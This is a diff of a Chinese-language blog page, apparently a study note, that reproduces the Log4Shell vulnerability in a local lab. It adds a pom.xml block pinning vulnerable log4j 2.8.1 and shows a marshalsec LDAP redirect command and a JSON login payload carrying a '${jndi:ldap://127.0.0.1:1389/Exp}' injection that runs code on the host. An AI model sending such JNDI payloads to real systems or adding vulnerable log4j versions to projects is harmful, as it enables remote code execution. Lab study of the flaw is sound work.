@@ -7897,6 +7897,18 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p>修改pom.xml文件</p>
 <img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091549004.png" style="zoom:80%;">
 
+<p>添加如下代码</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091247246.png" style="zoom:80%;">
 
 <p>在<code>log4j_demo\src\main\java\com\example\log4j_demo</code>下创建<code>HelloLog4j.java</code>，内容如下</p>
@@ -7983,19 +7995,19 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p>下载：<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
 <p>参考：<a href="https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)">https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)</a></p>
 <p>下载marshalsec，进到主目录，用如下命令编译</p>
-<pre class="line-numbers language-none"><code class="language-none">mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>编译成功cmd窗口末尾会显示如下内容</p>
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908111918530.png"></p>
 <p>然后开启LDAP服务</p>
-<pre class="line-numbers language-none"><code class="language-none">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#Exp"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#Exp"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908112631128.png"></p>
 <p>通过HackBar用POST请求发送json格式payload如下，执行后，会弹出系统计算机</p>
-<pre class="line-numbers language-none"><code class="language-none">{
-	"user": "wa0er",
-	"password": "${jndi:ldap://127.0.0.1:1389/Exp}"
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+	<span class="token property">"user"</span><span class="token operator">:</span> <span class="token string">"wa0er"</span><span class="token punctuation">,</span>
+	<span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"${jndi:ldap://127.0.0.1:1389/Exp}"</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908113116419.png"></p>
 <p>此时看LDAP和HTTP服务窗口如下，<code>Exp.class</code>被调用执行</p>
